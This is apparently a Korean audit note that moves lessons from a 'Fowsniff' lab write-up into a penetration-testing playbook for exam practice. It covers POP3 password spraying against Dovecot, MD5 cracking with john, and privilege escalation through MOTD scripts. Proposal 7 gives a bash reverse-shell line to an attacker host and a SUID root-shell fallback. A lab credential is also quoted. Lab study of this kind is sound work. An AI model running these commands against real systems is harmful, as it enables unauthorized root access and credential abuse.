---
tags:
  - type/audit
  - platform/pg
type: audit
platform: pg
manual_tags: true
manual_cves: true
---

# Fowsniff → `_PLAYBOOK` 이관 제안 (12건)

작성: `pg-note-forge` · 2026-08-26 · 대상 노트 `03. PG\Fowsniff.md` (774행 → 863행)
원문 백업: `03. PG\_backup\Fowsniff.md.bak`

> [!warning] 번호는 총괄이 배정한다
> 「신규」로 표기한 것은 절 번호를 비워 두었음. 노트 본문에 신규 항목 앵커를 걸지 않았음.
> 노트가 실제로 거는 `_PLAYBOOK` 앵커는 **기존 절 3개뿐**임 — `A-41. 셸은 잡았는데 권한상승 실마리가 없다` · `B-31. 크론 기반 권한상승` · `F-1. 이 볼트에서 자주 만난 것`.

**검산** — 박스 노트에서 삭제한 학습 블록 12건 = 아래 제안 12건. 옛 장 대응: `0장`→제안 6·7·9 / `6장`→제안 1·3·4·5·11 / `7장`→제안 2·5·6·7·10·12 / `8장`→노트의 `Vulnerability Fix:` 로 분산(이관 아님).

---

## 제안 1 — `A-1. 정찰·열거` · **신규**

### 넣을 본문

#### A-1-xx. 웹 루트에 미참조 이미지가 있다 — 스테가노 전에 «기성 템플릿»부터 확인한다

**증상** — `/images/` 에 `index.html` 이 참조하지 않는 이미지가 섞여 있음. 「참조 안 되는 파일 = 숨긴 것」 반사로 전부 받아 파게 됨.

[[Fowsniff]] — `banner.jpg`·`img1.jpg` 를 받아 팠고 **5분 소모.** 나온 것은 Photoshop 이 남긴 XMP 메타데이터뿐이었음.

```text
banner.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 1920x573, components 3
img1.jpg:   JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 1200x297, components 3
pic01.jpg:  JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, little-endian, direntries=4, xresolution=62, yresolution=70, resolutionunit=2], progressive, precision 8, 1200x297, components 3
```
— 출처: `~/PG/Fowsniff/web/` 보존 파일로 재확인(2026-08-26)

**판정 근거 둘** — ① `img1.jpg` 와 참조되는 `pic01.jpg` 의 해상도가 **1200x297 로 동일** ② 세 파일의 XMP `OriginalDocumentID` 가 **같은 uuid** (`uuid:152A5A7AC399E2118D48F504E8CD0A42`). 같은 원본을 다르게 저장한 자매 파일이지 은닉물이 아님.

⚠️ **`grep` 한 번으로 「없다」고 판정하지 말 것.** `pic01.jpg` 는 같은 uuid 를 **속성이 아니라 XML 엘리먼트 형태**(`<xmpMM:OriginalDocumentID>…</xmpMM:OriginalDocumentID>`)로 갖고 있어, 속성 패턴만 긁는 grep 에는 「없음」으로 나옴. 자동 판정을 부재 근거로 쓰지 말 것(A-11).

→ **가설을 세우기 전에 그 사이트가 기성 템플릿인지 확인할 것.** `README.txt`/`LICENSE.txt` 가 대놓고 적어둠 — [[Fowsniff]] 는 `Escape Velocity by HTML5 UP`, 데모 이미지는 사진작가 Felicia Simion 것이라고 명시돼 있었음. **미참조 자산은 정적 템플릿 사이트에서는 오히려 정상임.**

### 지우기 전 원문 (Fowsniff.md 6장)

```
### 이미지에 스테가노가 있는 줄 알았다 (5분)

`/images/` 에 `banner.jpg`·`img1.jpg` 가 있는데 `index.html` 은 `pic01.jpg` 만 참조한다. "참조 안 되는 파일 = 숨긴 것" 이라는 반사로 셋 다 받아서 팠다.

(file / strings 블록 — 위 본문에 옮김)

Photoshop 이 남긴 XMP 메타데이터뿐이었다. 결정적인 건 두 가지다 — `img1.jpg` 와 참조되는 `pic01.jpg` 의 해상도가 **1200x297 로 동일**하고, 세 파일의 XMP `OriginalDocumentID` 가 같은 uuid 다. 같은 원본을 다르게 저장한 자매 파일이지 은닉물이 아니다. `README.txt` 도 대놓고 적어놨다 — `Escape Velocity by HTML5 UP`, "Its demo images* are courtesy of ... Felicia Simion".

교훈: "웹 루트에 뭔가 숨겨져 있다" 가설을 세우기 전에 **그 사이트가 기성 템플릿인지** 확인한다. 미참조 자산은 정적 템플릿 사이트에서는 오히려 정상이다.
```

---

## 제안 2 — `A-1. 정찰·열거` · **신규**

### 넣을 본문

#### A-1-xx. 박스 안에 자격증명 소스가 없다 — 박스가 «지목한 밖»을 읽는다

**증상** — 웹에 동적 페이지가 하나도 없음(폼 없음, 확장자 없음, 파라미터 없음). 열거를 아무리 돌려도 진입점이 안 나옴.

[[Fowsniff]] — 웹 본문 자체가 답을 줌: 「데이터 유출로 직원 계정·비밀번호가 노출됐고 공격자가 공식 `@fowsniffcorp` 트위터 계정을 탈취했다」. **자격증명은 박스 안이 아니라 밖에 있었음.** 원본 paste(`pastebin.com/raw/NrAqVeeX`)는 404 로 삭제돼 공개 미러에서 해시 9쌍을 복원함.

⚠️ **OSCP 시험 박스는 자기 완결적이라 이 단계 자체는 전이되지 않음.** 정찰로 얻을 수 없는 값을 인터넷에서 가져와야 하는 구성은 시험에 나오지 않음. 전이되는 것은 **「박스 안을 더 파는 게 아니라 박스가 지목한 힌트를 다시 읽는다」는 판단** 하나임 — [[Fowsniff]] 는 그 판단이 늦어 이미지 스테가노에 5분을 씀.

→ **웹이 정적이라고 판정되면 15분 안에 접고**(D) 본문이 지목한 대상(사람 이름·제품명·SNS 계정·사건)으로 방향을 틀 것.

### 지우기 전 원문 (Fowsniff.md 1장 콜아웃 · 7장 10번)

```
> [!warning] 이 박스는 타겟 밖 자료를 요구한다 — 시험에서는 안 나온다
> OSCP 시험 박스는 자기 완결적이다. 정찰로 얻을 수 없는 값을 인터넷에서 가져와야 하는 구성은 나오지 않는다. 이 단계는 **시험 반사로 훈련할 것이 아니라, 여기서 막혔을 때 "박스 안을 더 파는 게 아니라 밖을 봐야 한다"는 판단**만 가져가면 된다.
> 박스 안을 더 판 시간이 실제로 있었다(6장 참조).
```
```
10. **이 박스의 OSINT 단계는 시험에 전이되지 않는다.** 시험 박스는 자기 완결적이다. 다만 "박스 안에서 자격증명 소스를 못 찾겠으면 박스가 지목한 외부 힌트를 다시 읽는다"는 판단은 유효하다.
```

---

## 제안 3 — `A-2. 진입 (foothold)` · **신규**

### 넣을 본문

#### A-2-xx. 인증 스프레이가 N번째 계정에서 타임아웃으로 죽는다 — 차단이 아니라 «사전 지연»이다

**증상** — 앞 두 계정은 응답이 오는데 세 번째에서 소켓 타임아웃. 「방화벽이 나를 차단했다」로 결론 내리면 시간을 태움.

[[Fowsniff]] 실측 — POP3 스프레이 1차 시도가 3번째 계정(`tegel`)에서 8초 타임아웃으로 죽음.

```text
mauer      mailcall     -> -ERR [AUTH] Authentication failed.
mustikka   bilbo101     -> -ERR [AUTH] Authentication failed.
Traceback (most recent call last):
  File "/home/kali/PG/Fowsniff/pop3spray.py", line 13, in <module>
    s.sendall(f'PASS {p}\r\n'.encode()); r2=rd(s)
                                            ~~^^^
  File "/home/kali/PG/Fowsniff/pop3spray.py", line 6, in rd
    while not d.endswith(b'\r\n'): d+=s.recv(4096)
                                      ~~~~~~^^^^^^
TimeoutError: timed out
```
— 출처: `~/PG/Fowsniff/try1_pop3spray.log`

**실제 원인** — Dovecot 이 같은 IP 의 인증 실패를 세면서 **다음 인증을 시작하기도 전에** 대기를 검. Dovecot 소스로 확인한 수치(`[가정]` Ubuntu 16.04 기본 패키지인 **2.2.22** 전제 — nmap 은 `Dovecot pop3d` 까지만 뱉었고 이 박스의 실제 버전은 관측되지 않았음):

- 실패할 때마다 penalty 가 1 오름 — `auth-request-handler.c`: `auth_penalty_update(auth_penalty, request, request->last_penalty + 1)`
- 다음 연결의 **사전 지연** = `auth_penalty_to_secs(penalty)` = `2` 를 penalty 번 두 배, 상한 15초(`auth-penalty.c`). penalty 0 이면 지연 없음, 1 → 4초, 2 → 8초, 3 이상 → 15초
- 여기에 실패 응답 자체의 지연 `auth_failure_delay` 가 더해짐. `auth-settings.c` 의 기본값은 `.failure_delay = 2`(2초)
- penalty 는 IP 별로 anvil 이 들고 있고 `AUTH_PENALTY_TIMEOUT` = 2+4+8+15 = **29초** 동안 유지됨(`auth-penalty.h`)

관측과 맞추면 1번째 ≈ 2초, 2번째 ≈ 4+2 = 6초, 3번째 ≈ 8+2 = 10초. **8초 타임아웃이 정확히 세 번째에서 터지는 것이 맞음.**

**고친 것 중 실제로 효과가 있었던 것은 타임아웃 40초 하나뿐임.** 지연 상한이 15+2 = 17초라 40초 안에 들어옴. 같이 넣은 `time.sleep(3)` 은 penalty 만료가 29초라 아무것도 리셋하지 못함 — 심리적 안전장치였을 뿐임. 정말 penalty 를 털려면 계정 사이에 **30초 이상** 쉬어야 함.

**구분법** — 차단이면 TCP 연결 자체가 안 되거나 RST 가 옴. 여기선 **연결은 되고 응답만 늦었음.** 그럼 애플리케이션 레이어의 의도된 지연임.

→ **인증 스프레이는 타임아웃을 넉넉히 잡을 것.** 짧으면 지연·락아웃·방화벽 중 무엇에 걸렸는지 구분이 안 됨. 그리고 「간격을 두면 괜찮겠지」는 **그 서비스의 만료 시간을 확인하지 않으면 근거 없는 위안임.**
→ **안 풀린 계정은 스프레이에서 빼둘 것.** 실패 카운트가 하나 더 쌓이면 뒤 계정의 사전 지연이 커짐([[Fowsniff]] 의 `if p.startswith('<'): continue`).

### 지우기 전 원문 (Fowsniff.md 6장 · 7장 5번)

```
### POP3 스프레이가 세 번째에서 죽었다 (타임아웃 오진 위험)

첫 시도 `try1_pop3spray.log` 원문:
(터미널 블록 — 위 본문에 그대로 옮김)

소켓 타임아웃이 8초였고 세 번째 계정(`tegel`)에서 걸렸다. **여기서 "방화벽이 나를 차단했다"고 결론 내리면 시간을 태운다.**

실제 원인은 Dovecot 이 같은 IP 의 인증 실패를 세면서 **다음 인증을 시작하기도 전에** 대기를 거는 것이다. Dovecot 소스로 확인한 수치(`[가정]` Ubuntu 16.04 기본 패키지인 **2.2.22** 전제 — nmap 은 `Dovecot pop3d` 까지만 뱉었고 이 박스의 실제 버전은 관측되지 않았음):
(불릿 4개 — 위 본문에 그대로 옮김)

관측과 맞춰보면 1번째 ≈ 2초, 2번째 ≈ 4+2 = 6초, 3번째 ≈ 8+2 = 10초. **8초 타임아웃이 정확히 세 번째에서 터지는 게 맞다.**

그래서 고친 것 중 실제로 효과가 있었던 건 **타임아웃 40초 하나뿐이다.** 지연 상한이 15+2 = 17초라 40초 안에 들어온다. 같이 넣은 `time.sleep(3)` 은 penalty 만료가 29초라 아무것도 리셋하지 못한다 — 심리적 안전장치였을 뿐이다. 정말 penalty 를 털고 싶으면 계정 사이에 **30초 이상** 쉬어야 한다.

구분법: 차단이면 TCP 연결 자체가 안 되거나 RST 가 온다. 여기선 **연결은 되고 응답만 늦었다.** 그럼 애플리케이션 레이어의 의도된 지연이다.

일반화: 인증 스프레이는 **타임아웃을 넉넉히** 잡는다. 타임아웃이 짧으면 지연·락아웃·방화벽 중 무엇에 걸렸는지 구분이 안 된다. 그리고 "간격을 두면 괜찮겠지"는 서비스마다 만료 시간을 확인하지 않으면 근거 없는 위안이다.
```
```
5. **스프레이는 타임아웃을 넉넉히.** 응답이 늦은 것과 차단된 것은 다르다 — 연결이 성립하면 애플리케이션 지연을 먼저 의심한다. 간격을 두는 건 **그 서비스의 만료 시간을 확인한 다음**에나 의미가 있다.
```

---

## 제안 4 — `A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 \`pkill -f\`` · **병합**

### 넣을 본문 (A-33 말미에 append)

**비대화형 배치 열거는 프롬프트 하나에 통째로 멈춘다.** [[Fowsniff]] — 원격 SSH 로 열거 명령을 한 번에 몰아넣었는데 `sudo -l` 이 비밀번호 프롬프트를 띄우고 멈춤. **뒤의 열거 명령이 하나도 안 돌았고 180초 타임아웃까지 그냥 대기함.** (이 실패 실행의 출력은 파일로 남지 않았음 — 남은 것은 `writeup_notes.txt` 15:02 의 「sudo -l 이 비번 프롬프트로 블로킹 → 180s 타임아웃」 한 줄임.)

- **`sudo -n -l` 을 쓸 것** — `-n` 은 프롬프트를 띄우지 않고 즉시 실패함
- 비밀번호를 아는 경우면 `echo '<pw>' | sudo -S -l` 로 stdin 에 먹임. [[Fowsniff]] 는 후자로 넘어갔고 결과는 `may not run sudo` 였음
- ⚠️ `-S` 는 비밀번호를 stdin 에서 읽지만 **프롬프트는 stderr 로 그대로 뿌림.** 원격 pty 출력과 겹치면 로그가 토막나 섞임 — `Sorry, user baksteen may not run sudo on fowsniff.` 가 `So` … `Connection to ... closed.` … ` fowsniff.` 로 갈라져 나왔음(`enum_baksteen.log`). 결론은 안 바뀌지만 나중에 읽을 때 「안 돌았나」 싶어짐. `sudo -n -l 2>/dev/null` 로 stderr 를 버리는 편이 로그가 깨끗함
- **프롬프트를 띄울 수 있는 명령은 전부 같은 취급** — `sudo` · `ssh`(호스트키) · `su` · `passwd` · `apt`. 하나가 멈추면 뒤가 전부 죽음

### 지우기 전 원문 (Fowsniff.md 6장 · 4장 콜아웃 · 7장 6번)

```
### `sudo -l` 이 셸을 3분 붙잡았다

`ssh -tt` 로 열거 명령을 한 번에 몰아넣었는데 `sudo -l` 이 비밀번호 프롬프트를 띄우고 멈췄다. 뒤의 열거 명령이 하나도 안 돌았고 180초 타임아웃까지 그냥 대기했다. (이 실패 실행의 출력은 파일로 남기지 않았다 — 남은 건 시간순 기록의 "sudo -l 이 비번 프롬프트로 블로킹 → 180s 타임아웃" 한 줄이다.)

**비대화형으로 열거를 배치할 때는 `sudo -n -l` 을 쓴다** — `-n` 은 프롬프트를 띄우지 않고 즉시 실패한다. 비밀번호를 아는 경우라면 `echo '<pw>' | sudo -S -l` 로 stdin 에 먹인다. 이 박스는 후자로 넘어갔고 결과는 `may not run sudo` 였다(4장의 깨진 출력이 그것이다).

배치 열거를 짤 때 **프롬프트를 띄울 수 있는 명령**은 전부 같은 취급을 해야 한다 — `sudo`, `ssh`(호스트키), `su`, `passwd`, `apt`. 하나가 멈추면 뒤가 전부 죽는다.
```
```
6. **비대화형 배치 열거에는 `sudo -n -l`.** `sudo -l` 은 프롬프트로 배치 전체를 멈춘다.
```

⚠️ **위 강등은 감사에서 다시 반증됨(2026-08-26)** — 「`ssh -tt` 로 강제한 의사터미널」은 **산출물이 뒷받침함.** `enum_baksteen.log` 7행의 `Connection to 192.168.248.18 closed.` 는 **tty 를 요청한 ssh 호출에서만** 출력되는 줄이고(Kali 에서 `ssh` vs `ssh -tt` 직접 비교, 무 `-t` 시 미출력), 이 줄과 경고 4줄만 CRLF 임. 앞선 강등 근거였던 「`~/.zsh_history` 매칭 0건」은 **이 박스의 명령이 전부 비대화형이라 애초에 히스토리에 한 줄도 안 남는다**는 뜻이라 어떤 서술도 반증하지 못함 — 전형적인 부재 근거 오용. 노트 본문의 `[가정]` 은 해제했고 위 제안 본문의 「원격 pty 출력」도 그대로 유효함.

---

## 제안 5 — `A-41. 셸은 잡았는데 권한상승 실마리가 없다` · **병합**

### 넣을 본문 (A-41 말미에 append)

**SUID·capability 는 «목록»이 아니라 «배포판 기본과 다른 것»을 보는 것이다.** [[Fowsniff]] — `/usr/bin/procmail` 이 SUID 로 있어 메일 서버와 관련 있어 보였으나 Ubuntu 16.04 의 `procmail` 패키지가 원래 SUID 로 설치되는 표준 바이너리였음. `getcap` 결과 셋(`systemd-detect-virt`·`mtr`·`traceroute6.iputils`)도 전부 배포판 기본값. `/etc/crontab` 도 배포판 원본 4줄뿐이고 `/etc/cron.d/` 에는 `popularity-contest` 만 있었음.
→ 기본 목록을 외우기 어려우면 **반대로 접근할 것** — `find / -perm -4000` 결과가 전부 `/bin`·`/usr/bin`·`/usr/lib` 안이고 `/opt`·`/usr/local`·홈에 아무것도 없으면 SUID 경로는 아닐 가능성이 높음.

**`id` 는 uid 뿐 아니라 «그룹»을 읽는 명령이다.** [[Fowsniff]] 의 정답은 SUID 가 아니라 `gid=100(users)` 였음 — 기본 그룹이 자기 이름 그룹이 아니라 공유 그룹이면 그 자체가 냄새임(관리자가 「직원 전부가 만질 수 있게」라고 생각한 흔적).

```bash
find / -group <내그룹> -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```
**SUID 다음 반사로 붙여둘 것.** 결과의 대부분은 자기 홈·`/run/user/<uid>` 라 소음이고, **눈은 `/opt`·`/usr/local`·`/srv`·`/var` 로 먼저 던질 것.** [[Fowsniff]] 는 그 필터 뒤에 `/opt/cube/cube.sh` 하나가 남았고 그것이 전부였음.

### 지우기 전 원문 (Fowsniff.md 0장 3번 · 6장 · 7장 2번)

```
- **보조 그룹 하나가 권한상승 경로다.** `gid=100(users)` 를 보고 `find / -group users -writable` 를 치는 반사.
```
```
### SUID·capability 목록을 훑느라 시간을 썼다

`/usr/bin/procmail` 이 SUID 로 있어서 잠깐 잡았다. 메일 서버니까 관련이 있어 보였다. 하지만 Ubuntu 16.04 의 `procmail` 패키지가 원래 SUID 로 설치되는 표준 바이너리고, `getcap` 결과 셋도 전부 배포판 기본값이다.

**목록을 보는 게 아니라 "배포판 기본과 다른 것"을 보는 것**이다. 기본 목록을 외우기 어려우면 반대로 접근한다 — `find / -perm -4000` 결과가 전부 `/bin`·`/usr/bin`·`/usr/lib` 안이고 `/opt`·`/usr/local`·홈 디렉터리에 아무것도 없으면 SUID 경로는 아닐 가능성이 높다.

정답은 SUID 가 아니라 **`id` 출력의 그룹**에 있었다. `find / -group <내그룹> -writable` 을 SUID 다음 반사로 붙여둘 것.
```
```
2. **`id` 는 uid 뿐 아니라 그룹을 읽는 명령이다.** 보조 그룹이나 낯선 기본 그룹이 보이면 `find / -group <그룹> -writable -type f 2>/dev/null` 을 바로 친다. 이 박스에서 sudo/SUID/cron 이 전부 비었을 때 유일하게 남은 경로였다.
```

---

## 제안 6 — `B-2. 네트워크 서비스` · **신규**

`F-1. 이 볼트에서 자주 만난 것` 의 110/143 행이 이미 「B-2」로 가리키고 있으나 **해당 카드가 실재하지 않음.** 이 제안이 그 자리를 채움.

### 넣을 본문

#### B-2x. POP3 / IMAP (110 · 143) — 메일함은 셸이 아니라 «다음 자격증명이 평문으로 적혀 있는 곳»이다

**판단 신호** — `nmap` 의 `pop3-capabilities` 에 **`USER`** 가 있으면 평문 `USER`/`PASS` 인증을 받는다는 뜻임. `SASL(PLAIN)` 이 같이 있으면 TLS 없이 평문 인증이 허용된 것. 이게 없으면 SASL 만 남아 스프레이 스크립트를 다르게 짜야 함.

**손으로 되는 명령은 넷뿐** — `USER` · `PASS` · `LIST` · `RETR <n>`. 도구가 없어도 막히지 않음.

```bash
(printf 'USER <u>\r\nPASS <p>\r\nLIST\r\n'; sleep 4; \
 printf 'RETR 1\r\n'; sleep 3; printf 'RETR 2\r\n'; sleep 3; \
 printf 'QUIT\r\n'; sleep 2) | nc <TARGET> 110
```
- `sleep` 이 필요한 이유 — 파이프로 몰아넣으면 클라이언트가 응답을 기다리지 않고 전부 밀어버림. POP3 는 파이프라이닝을 지원하지만 `nc` 는 응답을 다 받기 전에 EOF 로 연결을 닫아 **출력이 잘림**
- `USER` 응답이 그냥 `+OK` 라는 것은 **계정이 있든 없든 같다**는 뜻이라 사용자 열거에는 못 씀
- 성공 `+OK Logged in.` / 실패 `-ERR [AUTH] Authentication failed.`

**읽는 법** — 메일 본문에서 찾을 것은 ①임시·초기 비밀번호 ②수신자 목록(= 다음 스프레이 대상) ③「아직 안 읽었다」류의 진술.
[[Fowsniff]] 실측 — 1번 메일이 전 직원 8명에게 SSH 임시 비번 `S1ck3nBluff+secureshell` 을 평문으로 뿌렸고, 2번 메일에서 `baksteen` 이 「Stone 메일 아직 안 읽었다」고 써 **그 계정이 비번을 안 바꿨다는 신호**가 됨. 실제로 SSH 스프레이 9명 중 `baksteen` 만 통과.
⚠️ **신호를 믿고 하나만 찔러볼 이유는 없음** — 수신자 전원을 돌릴 것. 비용이 거의 없음.

**시험 관점** — POP3 는 netcat, 해시 크랙은 john/hashcat(둘 다 허용), SSH 스프레이는 `for` 루프 + `sshpass`. 이 부류는 **금지 도구를 쓸 일이 없음.** hydra 도 허용이지만 대상이 10개 안쪽이면 손으로 도는 편이 빠름.

**출처** — [[Fowsniff]].

### 지우기 전 원문 (Fowsniff.md 0장 1번 · 7장 1번 · 7번)

```
- **메일 서비스(110/143)를 자격증명 저장소로 본다.** POP3 는 셸이 아니라 *다음 자격증명이 평문으로 적혀 있는 곳*이다.
- **자격증명 재사용 체인** — 유출 덤프 → 메일 → SSH. 각 단계에서 살아남는 계정이 하나씩만 바뀐다.
```
```
1. **110/143 을 보면 셸이 아니라 메일함을 노린다.** POP3 는 `USER`/`PASS`/`LIST`/`RETR` 넷이면 충분하고 netcat 으로 손으로 된다. 도구가 없어도 막히지 않는다.
```
```
7. **자동 도구 없는 대안** — POP3 는 netcat, 해시 크랙은 john/hashcat(둘 다 허용), SSH 스프레이는 `for` 루프 + `sshpass`. 이 박스는 시험 금지 도구를 쓸 일이 없다. hydra 를 써도 되지만(허용) 대상이 9개뿐이라 손으로 도는 게 빠르다.
```

---

## 제안 7 — `B-3. 리눅스 권한상승` · **신규**

### 넣을 본문

#### B-3x. MOTD 권한상승 — `/etc/update-motd.d/` 는 SSH 로그인마다 root 로 돈다

**판단 신호** — Ubuntu · SSH 로그인 가능 · sudo/SUID/cron 이 전부 빔.

```bash
ls -la /etc/update-motd.d/
grep -r . /etc/update-motd.d/
```
**스크립트 자체가 root 소유(755)여도 그것이 «부르는 대상»이 쓰기 가능하면 끝임.** `grep -r` 로 외부 경로 호출을 한 번에 훑는 것이 빠름.

[[Fowsniff]] — `00-header`(root:root 755)가 원본 Canonical 스크립트의 `printf` 줄을 주석 처리하고 맨 아래에 `sh /opt/cube/cube.sh` 를 추가해 뒀음. 그 `cube.sh` 는 `-rw-rwxr-- parede:users`(모드 674) — 소유자는 실행조차 못 하는데 그룹 `users` 는 `rwx` 인, 손으로 잘못 준 권한의 전형.

**⚠️ 실행 주체는 릴리스마다 다르다 — 「pam_motd 가 돌린다」고 외우지 말 것.** [[Fowsniff]] 의 PAM 은 `pam_motd.so noupdate` 라 update-motd.d 를 **실행하지 않았고**, `sshd_config` 는 `PrintMotd no` 였음. 실제 실행 주체는 **sshd 특권 프로세스**였음(Ubuntu 가 OpenSSH 에 넣은 패치. `PrintMotd no` 여도 생성은 돌고 출력만 pam_motd 가 함).

**「왜 root 로 도는가」는 추측하지 말고 `/proc` 으로 증명할 것.** 스크립트 안에 프로브를 심어 자기 자신의 조상을 거슬러 올라감 — `/proc/<pid>/stat` 의 **4번째 필드가 ppid**, `/proc/<pid>/cmdline` 이 명령 전문. 이 두 줄이면 어떤 실행 경로든 뿌리까지 감.

```text
sh/opt/cube/cube.sh [pid 1882]
/bin/sh/etc/update-motd.d/00-header [pid 1881]
run-parts--lsbsysinit/etc/update-motd.d [pid 1880]
sh-c/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin
:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [pid 187
9]
sshd: baksteen [priv] [pid 1876]
/usr/sbin/sshd-D [pid 709]
```
— 출처: `~/PG/Fowsniff/enum4_motd_parent.log`

⚠️ **`cmdline` 은 NUL 구분이다** — `tr -d '\0'` 으로 지우면 위처럼 인자가 명령에 붙어 나옴. **`tr '\0' ' '` 로 바꿀 것.**

**공격 — 덮어쓰지 말고 append 할 것.** 원본 아트 출력이 남아야 로그인 화면이 정상으로 보이고, 복원도 `truncate -s <원본크기>` 한 번이면 됨.
```bash
printf '\nbash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1" &\n' >> /opt/cube/cube.sh
```
- `bash -c "..."` 로 감싸는 이유 — 호출자가 `#!/bin/sh`(dash)임. dash 는 `>&` 를 **리다이렉션 파싱에서** 거부해 `/dev/tcp` 에 도달조차 못 함: `dash: 1: Syntax error: Bad fd number`(2026-08-26 Kali 재확인, exit 2). 「dash 가 `/dev/tcp` 를 모른다」가 아님
- `&` 로 백그라운드에 던질 것. `[가정]` 안 붙이면 sshd 가 `> /run/motd.dynamic.new` 리다이렉션으로 `run-parts` 종료를 기다려 로그인이 멈출 것으로 보임 — [[Fowsniff]] 에서 실증하려던 순간 박스가 내려가 **실측하지 못했음**
- **아웃바운드가 막힌 경우 대안** — `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` 후 `/tmp/rootbash -p`(`-p` 없으면 euid 가 날아감, B-33)

**트리거가 시간이 아니라 «내 로그인»이다** — 크론과 달리 대기가 없음. 그냥 SSH 로 다시 들어가면 됨.

⚠️ **`/etc/profile.d/`·`~/.bashrc` 와 헷갈리지 말 것** — 그쪽은 **로그인하는 사용자 권한**으로 돌아 권한상승이 안 됨.

**변형** — `/etc/update-motd.d/` 자체가 그룹 쓰기 가능하거나, `00-header` 가 `/opt`·`/usr/local/bin` 아래 스크립트를 부르고 그 스크립트가 헐거운 형태. Ubuntu 박스에서 실제로 자주 나옴.

**출처** — [[Fowsniff]].

### 지우기 전 원문 (Fowsniff.md 0장 4번 · 1장 시험 출제 가능성 · 4장 tip 콜아웃 · 7장 3·4번)

```
- **MOTD 권한상승** — `/etc/update-motd.d/` 하위 스크립트가 SSH 로그인마다 root 로 실행된다. 다만 **실행 주체는 릴리스마다 다르다** — 이 박스는 pam_motd 가 아니라 sshd 였고, 그걸 `/proc` 으로 확인하는 절차가 4장이다.
```
```
**시험 출제 가능성** — MOTD 경로는 Ubuntu 박스에서 실제로 자주 나온다. 변형은 `/etc/update-motd.d/` 자체가 그룹 쓰기 가능하거나, `00-header` 가 `/opt`·`/usr/local/bin` 아래 스크립트를 부르고 그 스크립트가 헐거운 형태다. POP3/IMAP 이 열려 있는데 웹이 막다른 길이면 메일함부터 뒤지는 것도 그대로 전이된다.
```
```
> [!tip] 일반화 — Ubuntu 박스에서 SSH 로그인이 되는데 sudo/SUID 가 비었을 때
> `ls -la /etc/update-motd.d/` 와 그 안의 스크립트들이 무엇을 부르는지 본다. 스크립트 자체가 root 소유여도, 그것이 부르는 대상이 쓰기 가능하면 끝이다. `grep -r . /etc/update-motd.d/` 로 외부 경로 호출을 한 번에 훑는 게 빠르다.
> **누가 실행하는지는 릴리스마다 다르다** — 이 박스는 sshd 패치였고 pam_motd 는 `noupdate` 였다. 그러니 "pam 이 돌린다"고 외우지 말고 `/proc` 으로 확인하는 절차를 외워라. 그 절차는 MOTD 말고도 "왜 이게 root 로 도는가"를 물어야 하는 모든 곳에 쓰인다.
> `/etc/profile.d/`·`~/.bashrc` 와 헷갈리지 말 것 — 그쪽은 **로그인하는 사용자 권한**으로 돌아 권한상승이 안 된다.
```
```
3. **Ubuntu + SSH 로그인 가능 + 권한상승 막힘 → `/etc/update-motd.d/`.** 스크립트가 root 소유여도 그것이 부르는 대상을 확인한다. `grep -r . /etc/update-motd.d/`.
4. **"왜 root 로 도는가"는 추측하지 말고 `/proc` 으로 증명한다.** `/proc/<pid>/stat` 4번째 필드가 ppid, `/proc/<pid>/cmdline` 이 명령 전문(NUL 구분 — `tr '\0' ' '`). 이 두 줄이면 어떤 실행 경로든 뿌리까지 거슬러 올라간다.
```

---

## 제안 8 — `B-31. 크론 기반 권한상승` · **병합**

### 넣을 본문 (B-31 말미에 한 줄 append)

**같은 부류이나 트리거가 시간이 아닌 것도 있음** — MOTD 체인(`/etc/update-motd.d/`)은 root 가 **SSH 로그인마다** 남의 파일을 실행함. 대기 없이 즉시 발동시킬 수 있어 크론보다 유리함(B-3x · [[Fowsniff]]).

### 지우기 전 원문 (Fowsniff.md 「관련 노트」)

```
- 크론 기반 root 실행 경로: [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] — MOTD 도 "root 가 주기적/이벤트마다 남의 파일을 실행한다"는 같은 부류다. 다른 점은 트리거가 시간이 아니라 **내 로그인**이라 즉시 발동시킬 수 있다는 것.
```
(노트 본문에는 상호 링크 형태로 **유지**했음 — 이관이 아니라 복제. `_PLAYBOOK` 쪽에는 카드 간 참조로만 넣음.)

---

## 제안 9 — `B-6. 자격증명·크래킹` · **신규**

### 넣을 본문

#### B-6x. 솔트 없는 MD5 덤프 — 초 단위에 풀리고, 사용자 짝은 «따로» 되살려야 한다

**판단 신호** — `user:32자hex` 형식의 유출 덤프. 솔트가 없으므로 같은 평문은 항상 같은 해시이고, **후보 단어 하나를 한 번 해싱해 전 계정과 대조**할 수 있음. 사전 단어당 비용이 계정 수와 무관함.

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
- **`--format` 을 명시할 것.** 32자 hex 는 raw-MD5·NTLM·LM 등과 모양이 같아 자동판정이 엉뚱한 형식을 고르거나 되물음
- john 이 `Loaded N password hashes with **no different salts**` 라고 알려주는 것이 정확히 「솔트 없음」의 뜻임

**⚠️ `--show` 는 평문만 뱉고 사용자와 짝지어 주지 않는다** — 해시만 담긴 파일을 넣었으면 사용자 자리가 `?` 로 남음(`?:mailcall`). 짝을 되살리려면 평문을 다시 해싱해 덤프와 대조할 것.

```python
import hashlib
m={hashlib.md5(p.encode()).hexdigest():p for p in plains}
for line in open('dump.txt'):
    u,h=line.strip().split(':'); u=u.split('@')[0]
    print(f'{u}:{m.get(h,"<UNCRACKED>")}')
```
→ 애초에 **`user:hash` 형식 그대로 john 에 주면** `--show` 가 짝을 유지해 줌. 해시만 잘라 넣었을 때만 이 재조합이 필요함.

**크랙 로그의 진위 검산법** — wordlist 모드의 출력 순서는 크랙 난이도가 아니라 **wordlist 안의 행 순서**임(파일을 위에서 아래로 훑으므로). 사후에 각 평문의 행번호를 뽑아 출력 순서와 비교하면 그 로그가 진짜인지 검산됨.
